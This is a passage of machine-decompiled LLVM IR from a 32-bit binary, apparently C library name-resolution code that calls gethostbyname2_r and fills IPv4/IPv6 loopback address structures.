  %v1_805e46b191 = phi i32 [ %v2_805e49d, %dec_label_pc_805e474 ], [ %v2_805e44d, %dec_label_pc_805e456 ]
  %v0_805e461190 = phi i32 [ %v1_805e49f, %dec_label_pc_805e474 ], [ %v1_805e40c, %dec_label_pc_805e456 ]
  %v1_805e45c = inttoptr i32 %v1_805e46b191 to i32*
  %v2_805e45c = load i32, i32* %v1_805e45c, align 4
  %v3_805e45c = icmp eq i32 %v2_805e45c, 0
  %v1_805e45f = icmp eq i1 %v3_805e45c, false
  br i1 %v1_805e45f, label %dec_label_pc_805e474, label %dec_label_pc_805e461

dec_label_pc_805e461:                             ; preds = %dec_label_pc_805e45c
  %v1_805e464 = add i32 %v0_805e461190, -33
  %v1_805e468 = and i32 %v1_805e464, -16
  store i32 %v1_805e468, i32* %eax.global-to-local, align 4
  store i32 %v1_805e468, i32* %v1_805e45c, align 4
  %v0_805e46d = load i32, i32* %eax.global-to-local, align 4
  %v1_805e46d = add i32 %v0_805e46d, 24
  %v2_805e46d = inttoptr i32 %v1_805e46d to i32*
  store i32 0, i32* %v2_805e46d, align 4
  %v0_805e474.pre = load i32, i32* @edi, align 4
  %v1_805e474.phi.trans.insert = inttoptr i32 %v0_805e474.pre to i32*
  %v2_805e474.pre = load i32, i32* %v1_805e474.phi.trans.insert, align 4
  %v0_805e476.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805e474

dec_label_pc_805e474:                             ; preds = %dec_label_pc_805e45c, %dec_label_pc_805e461
  %v0_805e476 = phi i32 [ %v0_805e4a5192, %dec_label_pc_805e45c ], [ %v0_805e476.pre, %dec_label_pc_805e461 ]
  %v2_805e474 = phi i32 [ %v2_805e45c, %dec_label_pc_805e45c ], [ %v2_805e474.pre, %dec_label_pc_805e461 ]
  store i32 %v2_805e474, i32* %eax.global-to-local, align 4
  %v1_805e476 = add i32 %v0_805e476, 1
  store i32 %v1_805e476, i32* %ebx.global-to-local, align 4
  %v1_805e477 = inttoptr i32 %v2_805e474 to i32*
  store i32 0, i32* %v1_805e477, align 4
  %v0_805e47d = load i32, i32* @edi, align 4
  %v1_805e47d = inttoptr i32 %v0_805e47d to i32*
  %v2_805e47d = load i32, i32* %v1_805e47d, align 4
  store i32 %v2_805e47d, i32* %eax.global-to-local, align 4
  %v1_805e47f = add i32 %v2_805e47d, 4
  %v2_805e47f = inttoptr i32 %v1_805e47f to i32*
  store i32 10, i32* %v2_805e47f, align 4
  %v0_805e486 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e486 = load i32, i32* @esp, align 4
  %v2_805e486 = add i32 %v1_805e486, -4
  %v3_805e486 = inttoptr i32 %v2_805e486 to i32*
  store i32 %v0_805e486, i32* %v3_805e486, align 4
  %v3_805e487 = load i8*, i8** %stack_var_-32, align 4
  %v4_805e487 = ptrtoint i8* %v3_805e487 to i32
  store i32 %v4_805e487, i32* %eax.global-to-local, align 4
  %v1_805e48a = add i32 %v1_805e486, -8
  %v2_805e48a = inttoptr i32 %v1_805e48a to i32*
  store i32 16, i32* %v2_805e48a, align 4
  %v0_805e48c = load i32, i32* %eax.global-to-local, align 4
  %v1_805e48c = add i32 %v0_805e48c, 16
  %v2_805e48c = inttoptr i32 %v1_805e48c to i32*
  %v3_805e48c = load i32, i32* %v2_805e48c, align 4
  store i32 %v3_805e48c, i32* %eax.global-to-local, align 4
  %v1_805e48f = load i32, i32* %edx.global-to-local, align 4
  %v2_805e48f = add i32 %v1_805e48f, %v3_805e48c
  %v3_805e48f = inttoptr i32 %v2_805e48f to i32*
  %v4_805e48f = load i32, i32* %v3_805e48f, align 4
  %v6_805e48f = add i32 %v1_805e486, -12
  %v7_805e48f = inttoptr i32 %v6_805e48f to i32*
  store i32 %v4_805e48f, i32* %v7_805e48f, align 4
  %v0_805e492 = load i32, i32* @edi, align 4
  %v1_805e492 = inttoptr i32 %v0_805e492 to i32*
  %v2_805e492 = load i32, i32* %v1_805e492, align 4
  %v1_805e494 = add i32 %v2_805e492, 8
  store i32 %v1_805e494, i32* %eax.global-to-local, align 4
  %v2_805e497 = add i32 %v1_805e486, -16
  %v3_805e497 = inttoptr i32 %v2_805e497 to i32*
  store i32 %v1_805e494, i32* %v3_805e497, align 4
  %v0_805e498 = load i8*, i8** %stack_var_-268, align 4
  %tmp158 = bitcast i8* %v0_805e498 to i16*
  %v5_805e498 = call i32 @memcpy(i16* %tmp158, i32 %v4_805e289, i32 %v1_805e285)
  store i32 %v5_805e498, i32* %eax.global-to-local, align 4
  %v0_805e49d = load i32, i32* @edi, align 4
  %v1_805e49d = inttoptr i32 %v0_805e49d to i32*
  %v2_805e49d = load i32, i32* %v1_805e49d, align 4
  store i32 %v2_805e49d, i32* @edi, align 4
  %v0_805e49f = load i32, i32* @esp, align 4
  %v1_805e49f = add i32 %v0_805e49f, 16
  %v3_805e4a2.pre = load i8*, i8** %stack_var_-32, align 4
  %v0_805e4a5.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805e4a2 = ptrtoint i8* %v3_805e4a2.pre to i32
  store i32 %v4_805e4a2, i32* %eax.global-to-local, align 4
  %v1_805e4a5 = mul i32 %v0_805e4a5.pre, 4
  store i32 %v1_805e4a5, i32* %edx.global-to-local, align 4
  %v1_805e4ac = add i32 %v4_805e4a2, 16
  %v2_805e4ac = inttoptr i32 %v1_805e4ac to i32*
  %v3_805e4ac = load i32, i32* %v2_805e4ac, align 4
  store i32 %v3_805e4ac, i32* %eax.global-to-local, align 4
  %v2_805e4af = add i32 %v3_805e4ac, %v1_805e4a5
  %v3_805e4af = inttoptr i32 %v2_805e4af to i32*
  %v4_805e4af = load i32, i32* %v3_805e4af, align 4
  %v5_805e4af = icmp eq i32 %v4_805e4af, 0
  %v1_805e4b3 = icmp eq i1 %v5_805e4af, false
  br i1 %v1_805e4b3, label %dec_label_pc_805e45c, label %dec_label_pc_805e4b5

dec_label_pc_805e4b5:                             ; preds = %dec_label_pc_805e456, %dec_label_pc_805e474, %dec_label_pc_805e449, %dec_label_pc_805e3d5
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805e4b7

dec_label_pc_805e4b7:                             ; preds = %dec_label_pc_805e43d, %dec_label_pc_805e434, %dec_label_pc_805e4b5
  %v0_805e5b2 = phi i32 [ %v1_805e442, %dec_label_pc_805e43d ], [ -3, %dec_label_pc_805e434 ], [ 0, %dec_label_pc_805e4b5 ]
  store i32 %arg3, i32* @ecx, align 4
  %v3_805e4ba = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805e4ba, i32* %eax.global-to-local, align 4
  %v9_805e4bd = icmp eq i32 %v3_805e4ba, 2
  br i1 %v9_805e4bd, label %dec_label_pc_805e4d8, label %dec_label_pc_805e4c2

dec_label_pc_805e4c2:                             ; preds = %dec_label_pc_805e4b7
  %v4_805e4c2 = icmp eq i32 %stack_var_-160.0, 0
  %v1_805e4c9 = icmp eq i1 %v4_805e4c2, false
  br i1 %v1_805e4c9, label %dec_label_pc_805e4d4, label %dec_label_pc_805e4cb

dec_label_pc_805e4cb:                             ; preds = %dec_label_pc_805e4c2
  %v1_805e4cb = icmp eq i32 %v3_805e4ba, 0
  br i1 %v1_805e4cb, label %dec_label_pc_805e4d8, label %dec_label_pc_805e5b4

dec_label_pc_805e4d4:                             ; preds = %dec_label_pc_805e4c2
  %v1_805e4d4 = icmp eq i32 %v0_805e5b2, 0
  br i1 %v1_805e4d4, label %dec_label_pc_805e4df, label %dec_label_pc_805e4d8

dec_label_pc_805e4d8:                             ; preds = %dec_label_pc_805e4df, %dec_label_pc_805e4d4, %dec_label_pc_805e4cb, %dec_label_pc_805e4b7
  %v2_805e4fe = ptrtoint i32* %stack_var_-28 to i32
  %v2_805e502 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805e508 = ptrtoint i32* %stack_var_-68 to i32
  %v0_805e4f4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805e4ec

dec_label_pc_805e4df:                             ; preds = %dec_label_pc_805e4d4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805e4e2 = load i8, i8* %tmp116, align 1
  %v3_805e4e2 = and i8 %v2_805e4e2, 16
  %v4_805e4e2 = icmp eq i8 %v3_805e4e2, 0
  %v1_805e4e5 = icmp eq i1 %v4_805e4e2, false
  br i1 %v1_805e4e5, label %dec_label_pc_805e4d8, label %dec_label_pc_805e5b4

dec_label_pc_805e4ec:                             ; preds = %dec_label_pc_805e51e.dec_label_pc_805e4ec_crit_edge, %dec_label_pc_805e4d8
  %v0_805e4f4 = phi i32 [ %v1_805e516, %dec_label_pc_805e51e.dec_label_pc_805e4ec_crit_edge ], [ %v0_805e4f4.pre, %dec_label_pc_805e4d8 ]
  %v0_805e4ec = phi i32 [ %v0_805e4ec.pre, %dec_label_pc_805e51e.dec_label_pc_805e4ec_crit_edge ], [ 512, %dec_label_pc_805e4d8 ]
  %v2_805e4ec = mul i32 %v0_805e4ec, 2
  store i32 %v2_805e4ec, i32* @esi, align 4
  %v1_805e4ee = add i32 %v2_805e4ec, 30
  %v1_805e4f1 = and i32 %v1_805e4ee, -16
  %v2_805e4f4 = sub i32 %v0_805e4f4, %v1_805e4f1
  %v1_805e4f6 = add i32 %v2_805e4f4, 15
  store i32 %v1_805e4f6, i32* %edx.global-to-local, align 4
  %v2_805e4fa = add i32 %v2_805e4f4, -4
  %v3_805e4fa = inttoptr i32 %v2_805e4fa to i32*
  store i32 %v1_805e4f1, i32* %v3_805e4fa, align 4
  %v0_805e4fb = load i32, i32* %edx.global-to-local, align 4
  %v1_805e4fb = and i32 %v0_805e4fb, -16
  store i32 %v1_805e4fb, i32* %edx.global-to-local, align 4
  %v2_805e501 = add i32 %v2_805e4f4, -8
  %v3_805e501 = inttoptr i32 %v2_805e501 to i32*
  store i32 %v2_805e4fe, i32* %v3_805e501, align 4
  %v2_805e505 = add i32 %v2_805e4f4, -12
  %v3_805e505 = inttoptr i32 %v2_805e505 to i32*
  store i32 %v2_805e502, i32* %v3_805e505, align 4
  %v0_805e506 = load i32, i32* @esi, align 4
  %v2_805e506 = add i32 %v2_805e4f4, -16
  %v3_805e506 = inttoptr i32 %v2_805e506 to i32*
  store i32 %v0_805e506, i32* %v3_805e506, align 4
  %v0_805e507 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e507 = add i32 %v2_805e4f4, -20
  %v3_805e507 = inttoptr i32 %v2_805e507 to i32*
  store i32 %v0_805e507, i32* %v3_805e507, align 4
  store i32 %v2_805e508, i32* %eax.global-to-local, align 4
  %v2_805e50b = add i32 %v2_805e4f4, -24
  %v3_805e50b = inttoptr i32 %v2_805e50b to i32*
  store i32 %v2_805e508, i32* %v3_805e50b, align 4
  %v1_805e50c = add i32 %v2_805e4f4, -28
  %v2_805e50c = inttoptr i32 %v1_805e50c to i32*
  store i32 2, i32* %v2_805e50c, align 4
  %v3_805e50e = load i8*, i8** %stack_var_4, align 4
  %v4_805e50e = ptrtoint i8* %v3_805e50e to i32
  %v6_805e50e = add i32 %v2_805e4f4, -32
  %v7_805e50e = inttoptr i32 %v6_805e50e to i32*
  store i32 %v4_805e50e, i32* %v7_805e50e, align 4
  %v0_805e511 = call i32 @gethostbyname2_r()
  store i32 %v0_805e511, i32* %eax.global-to-local, align 4
  %v0_805e516 = load i32, i32* @esp, align 4
  %v1_805e516 = add i32 %v0_805e516, 32
  %v9_805e519 = icmp eq i32 %v0_805e511, 34
  %v1_805e51c = icmp eq i1 %v9_805e519, false
  br i1 %v1_805e51c, label %dec_label_pc_805e526, label %dec_label_pc_805e51e

dec_label_pc_805e51e:                             ; preds = %dec_label_pc_805e4ec
  %v3_805e51e = load i32, i32* %stack_var_-28, align 4
  %v13_805e51e = icmp eq i32 %v3_805e51e, -1
  br i1 %v13_805e51e, label %dec_label_pc_805e51e.dec_label_pc_805e4ec_crit_edge, label %dec_label_pc_805e52a

dec_label_pc_805e51e.dec_label_pc_805e4ec_crit_edge: ; preds = %dec_label_pc_805e51e
  %v0_805e4ec.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805e4ec

dec_label_pc_805e526:                             ; preds = %dec_label_pc_805e4ec
  %v1_805e526 = icmp eq i32 %v0_805e511, 0
  br i1 %v1_805e526, label %dec_label_pc_805e54a, label %dec_label_pc_805e526.dec_label_pc_805e52a_crit_edge

dec_label_pc_805e526.dec_label_pc_805e52a_crit_edge: ; preds = %dec_label_pc_805e526
  %v3_805e52a.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805e52a

dec_label_pc_805e52a:                             ; preds = %dec_label_pc_805e51e, %dec_label_pc_805e526.dec_label_pc_805e52a_crit_edge
  %v0_805e542 = phi i32 [ %v3_805e52a.pre, %dec_label_pc_805e526.dec_label_pc_805e52a_crit_edge ], [ %v3_805e51e, %dec_label_pc_805e51e ]
  store i32 %v0_805e542, i32* %edx.global-to-local, align 4
  %v10_805e52d = icmp eq i32 %v0_805e542, -1
  br i1 %v10_805e52d, label %dec_label_pc_805e945, label %dec_label_pc_805e536

dec_label_pc_805e536:                             ; preds = %dec_label_pc_805e52a
  %v9_805e536 = icmp eq i32 %v0_805e542, 2
  store i32 -3, i32* %eax.global-to-local, align 4
  br i1 %v9_805e536, label %dec_label_pc_805e5b8, label %dec_label_pc_805e540

dec_label_pc_805e540:                             ; preds = %dec_label_pc_805e536
  store i32 0, i32* %eax.global-to-local, align 4
  %v9_805e542 = icmp eq i32 %v0_805e542, 4
  %v1_805e545 = zext i1 %v9_805e542 to i32
  br label %dec_label_pc_805e5b4

dec_label_pc_805e54a:                             ; preds = %dec_label_pc_805e526
  store i32 0, i32* @ebx, align 4
  %v3_805e54c = load i8*, i8** %stack_var_-32, align 4
  %v5_805e54c = icmp eq i8* %v3_805e54c, null
  %v1_805e550 = icmp eq i1 %v5_805e54c, false
  br i1 %v1_805e550, label %dec_label_pc_805e59d.preheader, label %dec_label_pc_805e5d9

dec_label_pc_805e59d.preheader:                   ; preds = %dec_label_pc_805e54a
  %v4_805e59d170 = ptrtoint i8* %v3_805e54c to i32
  store i32 %v4_805e59d170, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805e5a7171 = add i32 %v4_805e59d170, 16
  %v2_805e5a7172 = inttoptr i32 %v1_805e5a7171 to i32*
  %v3_805e5a7173 = load i32, i32* %v2_805e5a7172, align 4
  store i32 %v3_805e5a7173, i32* %eax.global-to-local, align 4
  %v3_805e5aa174 = inttoptr i32 %v3_805e5a7173 to i32*
  %v4_805e5aa175 = load i32, i32* %v3_805e5aa174, align 4
  %v5_805e5aa176 = icmp eq i32 %v4_805e5aa175, 0
  %v1_805e5ae178 = icmp eq i1 %v5_805e5aa176, false
  br i1 %v1_805e5ae178, label %dec_label_pc_805e557.lr.ph, label %dec_label_pc_805e5d9

dec_label_pc_805e557.lr.ph:                       ; preds = %dec_label_pc_805e59d.preheader
  %v0_805e557.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e557

dec_label_pc_805e557:                             ; preds = %dec_label_pc_805e557.lr.ph, %dec_label_pc_805e56f
  %v0_805e557 = phi i32 [ %v0_805e557.pre, %dec_label_pc_805e557.lr.ph ], [ %v2_805e598, %dec_label_pc_805e56f ]
  %v0_805e5a0180 = phi i32 [ 0, %dec_label_pc_805e557.lr.ph ], [ %v0_805e5a0.pre, %dec_label_pc_805e56f ]
  %v0_805e55c179 = phi i32 [ %v1_805e516, %dec_label_pc_805e557.lr.ph ], [ %v1_805e59a, %dec_label_pc_805e56f ]
  %v1_805e557 = inttoptr i32 %v0_805e557 to i32*
  %v2_805e557 = load i32, i32* %v1_805e557, align 4
  %v3_805e557 = icmp eq i32 %v2_805e557, 0
  %v1_805e55a = icmp eq i1 %v3_805e557, false
  br i1 %v1_805e55a, label %dec_label_pc_805e56f, label %dec_label_pc_805e55c

dec_label_pc_805e55c:                             ; preds = %dec_label_pc_805e557
  %v1_805e55f = add i32 %v0_805e55c179, -33
  %v1_805e563 = and i32 %v1_805e55f, -16
  store i32 %v1_805e563, i32* %eax.global-to-local, align 4
  store i32 %v1_805e563, i32* %v1_805e557, align 4
  %v0_805e568 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e568 = add i32 %v0_805e568, 24
  %v2_805e568 = inttoptr i32 %v1_805e568 to i32*
  store i32 0, i32* %v2_805e568, align 4
  %v0_805e56f.pre = load i32, i32* @edi, align 4
  %v1_805e56f.phi.trans.insert = inttoptr i32 %v0_805e56f.pre to i32*
  %v2_805e56f.pre = load i32, i32* %v1_805e56f.phi.trans.insert, align 4
  %v0_805e571.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805e56f

dec_label_pc_805e56f:                             ; preds = %dec_label_pc_805e557, %dec_label_pc_805e55c
  %v0_805e571 = phi i32 [ %v0_805e5a0180, %dec_label_pc_805e557 ], [ %v0_805e571.pre, %dec_label_pc_805e55c ]
  %v2_805e56f = phi i32 [ %v2_805e557, %dec_label_pc_805e557 ], [ %v2_805e56f.pre, %dec_label_pc_805e55c ]
  store i32 %v2_805e56f, i32* %eax.global-to-local, align 4
  %v1_805e571 = add i32 %v0_805e571, 1
  store i32 %v1_805e571, i32* @ebx, align 4
  %v1_805e572 = inttoptr i32 %v2_805e56f to i32*
  store i32 0, i32* %v1_805e572, align 4
  %v0_805e578 = load i32, i32* @edi, align 4
  %v1_805e578 = inttoptr i32 %v0_805e578 to i32*
  %v2_805e578 = load i32, i32* %v1_805e578, align 4
  store i32 %v2_805e578, i32* %eax.global-to-local, align 4
  %v1_805e57a = add i32 %v2_805e578, 4
  %v2_805e57a = inttoptr i32 %v1_805e57a to i32*
  store i32 2, i32* %v2_805e57a, align 4
  %v0_805e581 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e581 = load i32, i32* @esp, align 4
  %v2_805e581 = add i32 %v1_805e581, -4
  %v3_805e581 = inttoptr i32 %v2_805e581 to i32*
  store i32 %v0_805e581, i32* %v3_805e581, align 4
  %v3_805e582 = load i8*, i8** %stack_var_-32, align 4
  %v4_805e582 = ptrtoint i8* %v3_805e582 to i32
  store i32 %v4_805e582, i32* %eax.global-to-local, align 4
  %v1_805e585 = add i32 %v1_805e581, -8
  %v2_805e585 = inttoptr i32 %v1_805e585 to i32*
  store i32 4, i32* %v2_805e585, align 4
  %v0_805e587 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e587 = add i32 %v0_805e587, 16
  %v2_805e587 = inttoptr i32 %v1_805e587 to i32*
  %v3_805e587 = load i32, i32* %v2_805e587, align 4
  store i32 %v3_805e587, i32* %eax.global-to-local, align 4
  %v1_805e58a = load i32, i32* %edx.global-to-local, align 4
  %v2_805e58a = add i32 %v1_805e58a, %v3_805e587
  %v3_805e58a = inttoptr i32 %v2_805e58a to i32*
  %v4_805e58a = load i32, i32* %v3_805e58a, align 4
  %v6_805e58a = add i32 %v1_805e581, -12
  %v7_805e58a = inttoptr i32 %v6_805e58a to i32*
  store i32 %v4_805e58a, i32* %v7_805e58a, align 4
  %v0_805e58d = load i32, i32* @edi, align 4
  %v1_805e58d = inttoptr i32 %v0_805e58d to i32*
  %v2_805e58d = load i32, i32* %v1_805e58d, align 4
  %v1_805e58f = add i32 %v2_805e58d, 8
  store i32 %v1_805e58f, i32* %eax.global-to-local, align 4
  %v2_805e592 = add i32 %v1_805e581, -16
  %v3_805e592 = inttoptr i32 %v2_805e592 to i32*
  store i32 %v1_805e58f, i32* %v3_805e592, align 4
  %v0_805e593 = load i8*, i8** %stack_var_-268, align 4
  %tmp159 = bitcast i8* %v0_805e593 to i16*
  %v5_805e593 = call i32 @memcpy(i16* %tmp159, i32 %v4_805e289, i32 %v1_805e285)
  store i32 %v5_805e593, i32* %eax.global-to-local, align 4
  %v0_805e598 = load i32, i32* @edi, align 4
  %v1_805e598 = inttoptr i32 %v0_805e598 to i32*
  %v2_805e598 = load i32, i32* %v1_805e598, align 4
  store i32 %v2_805e598, i32* @edi, align 4
  %v0_805e59a = load i32, i32* @esp, align 4
  %v1_805e59a = add i32 %v0_805e59a, 16
  %v3_805e59d.pre = load i8*, i8** %stack_var_-32, align 4
  %v0_805e5a0.pre = load i32, i32* @ebx, align 4
  %v4_805e59d = ptrtoint i8* %v3_805e59d.pre to i32
  store i32 %v4_805e59d, i32* %eax.global-to-local, align 4
  %v1_805e5a0 = mul i32 %v0_805e5a0.pre, 4
  store i32 %v1_805e5a0, i32* %edx.global-to-local, align 4
  %v1_805e5a7 = add i32 %v4_805e59d, 16
  %v2_805e5a7 = inttoptr i32 %v1_805e5a7 to i32*
  %v3_805e5a7 = load i32, i32* %v2_805e5a7, align 4
  store i32 %v3_805e5a7, i32* %eax.global-to-local, align 4
  %v2_805e5aa = add i32 %v3_805e5a7, %v1_805e5a0
  %v3_805e5aa = inttoptr i32 %v2_805e5aa to i32*
  %v4_805e5aa = load i32, i32* %v3_805e5aa, align 4
  %v5_805e5aa = icmp eq i32 %v4_805e5aa, 0
  %v1_805e5ae = icmp eq i1 %v5_805e5aa, false
  br i1 %v1_805e5ae, label %dec_label_pc_805e557, label %dec_label_pc_805e5d9

dec_label_pc_805e5b4:                             ; preds = %dec_label_pc_805e4cb, %dec_label_pc_805e4df, %dec_label_pc_805e540
  %storemerge8 = phi i32 [ %v1_805e545, %dec_label_pc_805e540 ], [ 0, %dec_label_pc_805e4df ], [ %v0_805e5b2, %dec_label_pc_805e4cb ]
  store i32 %storemerge8, i32* %eax.global-to-local, align 4
  %v1_805e5b4 = icmp eq i32 %storemerge8, 0
  br i1 %v1_805e5b4, label %dec_label_pc_805e5d9, label %dec_label_pc_805e5b8

dec_label_pc_805e5b8:                             ; preds = %dec_label_pc_805e5b4, %dec_label_pc_805e536
  %v0_805e5bc = phi i32 [ %storemerge8, %dec_label_pc_805e5b4 ], [ -3, %dec_label_pc_805e536 ]
  %v0_805e5b8 = load i32, i32* @ebx, align 4
  %v1_805e5b8 = icmp eq i32 %v0_805e5b8, 0
  br i1 %v1_805e5b8, label %dec_label_pc_805e5d9, label %dec_label_pc_805e5bc

dec_label_pc_805e5bc:                             ; preds = %dec_label_pc_805e5b8
  %v10_805e5bc = icmp eq i32 %v0_805e5bc, -3
  %v1_805e5bf = icmp eq i1 %v10_805e5bc, false
  br i1 %v1_805e5bf, label %dec_label_pc_805e5cf, label %dec_label_pc_805e5c1

dec_label_pc_805e5c1:                             ; preds = %dec_label_pc_805e5bc
  %v10_805e5c1 = icmp eq i32 %v0_805e5b8, -3
  store i32 3, i32* %eax.global-to-local, align 4
  br i1 %v10_805e5c1, label %dec_label_pc_805e960, label %dec_label_pc_805e5cf

dec_label_pc_805e5cf:                             ; preds = %dec_label_pc_805e5c1, %dec_label_pc_805e5bc
  store i32 259, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e5d9:                             ; preds = %dec_label_pc_805e59d.preheader, %dec_label_pc_805e56f, %dec_label_pc_805e54a, %dec_label_pc_805e5b8, %dec_label_pc_805e5b4, %dec_label_pc_805e3bd, %dec_label_pc_805e3b0
  %v3_805e5d9 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e5d9, i32* %eax.global-to-local, align 4
  %v1_805e5dc = add i32 %v3_805e5d9, 4
  %v2_805e5dc = inttoptr i32 %v1_805e5dc to i32*
  %v3_805e5dc = load i32, i32* %v2_805e5dc, align 4
  %v4_805e5dc = icmp eq i32 %v3_805e5dc, 0
  %v1_805e5e0 = icmp eq i1 %v4_805e5dc, false
  br i1 %v1_805e5e0, label %dec_label_pc_805e694, label %dec_label_pc_805e93e

dec_label_pc_805e5eb:                             ; preds = %dec_label_pc_805e250
  %v8_805e5f3 = ptrtoint i32* %stack_var_-240 to i32
  store i32 %v8_805e5f3, i32* %eax.global-to-local, align 4
  store i32 %v8_805e5f3, i32* @ebx, align 4
  %tmp160 = bitcast i32* %stack_var_-240 to i8*
  store i8* %tmp160, i8** %stack_var_-268, align 4
  store i32 %v8_805e5f3, i32* %stack_var_-24, align 4
  %v5_805e600 = call i32 @__GI_memset(i8* %tmp160, i32 0, i32 28)
  store i32 %v5_805e600, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805e60b = load i32, i32* %v2_805dfee, align 4
  %v4_805e60b = icmp eq i32 %v3_805e60b, 0
  %v1_805e60f = icmp eq i1 %v4_805e60b, false
  br i1 %v1_805e60f, label %dec_label_pc_805e632, label %dec_label_pc_805e611

dec_label_pc_805e611:                             ; preds = %dec_label_pc_805e5eb
  %v3_805e611 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e611, i32* %edx.global-to-local, align 4
  %v8_805e61b = ptrtoint i32* %stack_var_-288 to i32
  %v2_805e61e = inttoptr i32 %v3_805e611 to i32*
  store i32 %v8_805e61b, i32* %v2_805e61e, align 4
  %v3_805e620 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e620, i32* %eax.global-to-local, align 4
  %v1_805e628 = inttoptr i32 %v3_805e620 to i32*
  %v2_805e628 = load i32, i32* %v1_805e628, align 4
  %v3_805e62a = inttoptr i32 %v2_805e628 to i8*
  %v4_805e62a = call i32 @__GI_memset(i8* %v3_805e62a, i32 0, i32 28)
  store i32 %v4_805e62a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e632

dec_label_pc_805e632:                             ; preds = %dec_label_pc_805e5eb, %dec_label_pc_805e611
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v3_805e635 = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805e635, i32* %eax.global-to-local, align 4
  %v1_805e638 = icmp eq i32 %v3_805e635, 0
  br i1 %v1_805e638, label %dec_label_pc_805e641, label %dec_label_pc_805e63c

dec_label_pc_805e63c:                             ; preds = %dec_label_pc_805e632
  %v9_805e63c = icmp eq i32 %v3_805e635, 10
  %v1_805e63f = icmp eq i1 %v9_805e63c, false
  br i1 %v1_805e63f, label %dec_label_pc_805e66f, label %dec_label_pc_805e641

dec_label_pc_805e641:                             ; preds = %dec_label_pc_805e63c, %dec_label_pc_805e632
  %v3_805e641 = load i32, i32* %stack_var_-24, align 4
  %v1_805e644 = add i32 %v3_805e641, 4
  %v2_805e644 = inttoptr i32 %v1_805e644 to i32*
  store i32 10, i32* %v2_805e644, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805e64e = load i8, i8* %tmp116, align 1
  %v3_805e64e = urem i8 %v2_805e64e, 2
  %v4_805e64e = icmp eq i8 %v3_805e64e, 0
  %v1_805e651 = icmp eq i1 %v4_805e64e, false
  br i1 %v1_805e651, label %dec_label_pc_805e66a, label %dec_label_pc_805e653

dec_label_pc_805e653:                             ; preds = %dec_label_pc_805e641
  %v3_805e653 = load i32, i32* %stack_var_-24, align 4
  %v1_805e65e = add i32 %v3_805e653, 8
  store i32 %v1_805e65e, i32* %eax.global-to-local, align 4
  %v5_805e661 = inttoptr i32 %v1_805e65e to i8*
  store i8* %v5_805e661, i8** %stack_var_-268, align 4
  %tmp161 = inttoptr i32 %v1_805e65e to i16*
  %v5_805e662 = call i32 @memcpy(i16* %tmp161, i32 ptrtoint (i32* @global_var_806e578.666 to i32), i32 16)
  store i32 %v5_805e662, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e66a

dec_label_pc_805e66a:                             ; preds = %dec_label_pc_805e641, %dec_label_pc_805e653
  %v3_805e66a = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e66a, i32* %eax.global-to-local, align 4
  %v1_805e66d = inttoptr i32 %v3_805e66a to i32*
  %v2_805e66d = load i32, i32* %v1_805e66d, align 4
  store i32 %v2_805e66d, i32* @ebx, align 4
  br label %dec_label_pc_805e66f

dec_label_pc_805e66f:                             ; preds = %dec_label_pc_805e63c, %dec_label_pc_805e66a
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805e672 = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805e672, i32* %eax.global-to-local, align 4
  %v1_805e675 = icmp eq i32 %v3_805e672, 0
  br i1 %v1_805e675, label %dec_label_pc_805e67e, label %dec_label_pc_805e679

dec_label_pc_805e679:                             ; preds = %dec_label_pc_805e66f
  %v9_805e679 = icmp eq i32 %v3_805e672, 2
  %v1_805e67c = icmp eq i1 %v9_805e679, false
  br i1 %v1_805e67c, label %dec_label_pc_805e694, label %dec_label_pc_805e67e

dec_label_pc_805e67e:                             ; preds = %dec_label_pc_805e679, %dec_label_pc_805e66f
  %v0_805e67e = load i32, i32* @ebx, align 4
  %v1_805e67e = add i32 %v0_805e67e, 4
  %v2_805e67e = inttoptr i32 %v1_805e67e to i32*
  store i32 2, i32* %v2_805e67e, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_805e688 = load i8, i8* %tmp116, align 1
  %v3_805e688 = urem i8 %v2_805e688, 2
  %v4_805e688 = icmp eq i8 %v3_805e688, 0
  %v1_805e68b = icmp eq i1 %v4_805e688, false
  br i1 %v1_805e68b, label %dec_label_pc_805e694, label %dec_label_pc_805e68d

dec_label_pc_805e68d:                             ; preds = %dec_label_pc_805e67e
  %v0_805e68d = load i32, i32* @ebx, align 4
  %v1_805e68d = add i32 %v0_805e68d, 8
  %v2_805e68d = inttoptr i32 %v1_805e68d to i32*
  store i32 16777343, i32* %v2_805e68d, align 4
  br label %dec_label_pc_805e694

dec_label_pc_805e694:                             ; preds = %dec_label_pc_805e67e, %dec_label_pc_805e679, %dec_label_pc_805e5d9, %dec_label_pc_805e68d
  %v4_805e694 = icmp eq i32 %arg4, 0
  br i1 %v4_805e694, label %dec_label_pc_805e95e, label %dec_label_pc_805e69e

dec_label_pc_805e69e:                             ; preds = %dec_label_pc_805e694
